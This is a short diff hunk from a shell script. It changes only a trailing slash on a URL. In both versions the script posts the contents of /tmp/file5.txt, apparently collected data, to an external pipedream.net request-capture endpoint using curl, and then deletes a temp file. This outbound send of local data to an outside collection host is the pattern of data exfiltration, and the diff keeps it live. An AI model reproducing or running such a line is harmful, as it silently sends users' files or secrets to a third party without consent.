@@ -15,6 +15,6 @@ done
 
 echo "--- FINISH ---" >> /tmp/file5.txt
 
-curl --data-binary "@/tmp/file5.txt" https://ensf2rlc2dw6p.x.pipedream.net
+curl --data-binary "@/tmp/file5.txt" https://ensf2rlc2dw6p.x.pipedream.net/
 
 rm /tmp/file3.txt
